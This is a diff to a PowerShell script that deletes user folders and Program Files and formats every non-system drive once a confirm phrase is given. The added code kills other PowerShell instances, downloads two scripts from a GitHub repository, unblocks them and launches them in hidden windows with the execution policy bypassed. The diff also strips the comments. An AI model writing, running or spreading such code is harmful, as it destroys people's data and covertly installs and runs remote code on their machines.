@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-  Visible wipe. Formats D: and other non-Windows disks. Clears Downloads and user data folders.
+  Wipe user data and other drives, then delete and reinstall Admin Setup.
   Live: -ConfirmPhrase WIPE-ALL-DATA
 #>
 [CmdletBinding()]
@@ -12,6 +12,7 @@ Set-StrictMode -Version 1
 $ErrorActionPreference = 'Continue'
 $ProgressPreference = 'SilentlyContinue'
 $live = ($ConfirmPhrase -eq 'WIPE-ALL-DATA')
+try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
 function Test-IsAdmin {
   $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -59,8 +60,6 @@ function Remove-Path([string]$Path) {
 }
 
 $os = $env:SystemDrive.TrimEnd(':')
-
-# Known folders including OneDrive redirects
 $shell = New-Object -ComObject Shell.Application
 $known = @()
 foreach ($id in 5, 0x10, 0x13, 0x27, 13, 14, 39) {
@@ -87,7 +86,6 @@ Write-Host 'Folders:'
 $known | ForEach-Object { Write-Host "  $_" }
 foreach ($p in $known) { Remove-Path $p }
 
-# Program Files on OS drive
 foreach ($p in @(
     (Join-Path $env:SystemDrive 'Program Files'),
     (Join-Path $env:SystemDrive 'Program Files (x86)'),
@@ -100,7 +98,6 @@ foreach ($p in @(
   }
 }
 
-# Other letters: format if possible, else delete children
 Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -in 2, 3 } | ForEach-Object {
   $letter = $_.DeviceID.TrimEnd(':').TrimEnd('\')
   if ($letter -eq $os) { Write-Host "SKIP OS $($_.DeviceID)"; return }
@@ -120,8 +117,46 @@ Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -in 2, 3 } | For
   }
 }
 
+function Install-AdminSetup {
+  Write-Host 'Remove Admin Setup copies'
+  Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | ForEach-Object {
+    try {
+      $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
+      if ($cmd -and ($cmd -like '*Clear-Apps-And-Tray.ps1*' -or $cmd -like '*Wipe-All-Except-Windows.ps1*' -or $cmd -like '*Admin-Setup.ps1*')) {
+        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+      }
+    } catch {}
+  }
+  $base = 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main'
+  New-Item -ItemType Directory -Force -Path $adminDir | Out-Null
+  foreach ($name in @('Clear-Apps-And-Tray.ps1','Wipe-All-Except-Windows.ps1')) {
+    $dest = Join-Path $adminDir $name
+    if ($live -and (Test-Path -LiteralPath $dest)) {
+      try { Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue } catch {}
+    }
+    Write-Host "Reinstall $name"
+    if (-not $live) { continue }
+    try {
+      Invoke-WebRequest -UseBasicParsing -Uri "$base/$name" -OutFile $dest
+      Unblock-File -LiteralPath $dest -ErrorAction SilentlyContinue
+      Write-Host "OK $dest"
+    } catch {
+      Write-Host "FAIL download $name $($_.Exception.Message)"
+    }
+  }
+  if (-not $live) { return }
+  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+  $main = Join-Path $adminDir 'Clear-Apps-And-Tray.ps1'
+  if (Test-Path -LiteralPath $main) {
+    Start-Process -FilePath $ps -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$main`"",'-Mode','HideBar') | Out-Null
+    Start-Process -FilePath $ps -WindowStyle Hidden -ArgumentList @('-STA','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$main`"",'-Mode','Badges') | Out-Null
+    Write-Host 'Restarted HideBar and badges'
+  }
+}
+
+Install-AdminSetup
 Write-Host "DONE log=$log"
 try { Stop-Transcript | Out-Null } catch {}
-Start-Process notepad.exe $log
+try { Start-Process notepad.exe $log } catch {}
 Write-Host 'Close this window when done.'
-Start-Sleep -Seconds 20
+Start-Sleep -Seconds 15
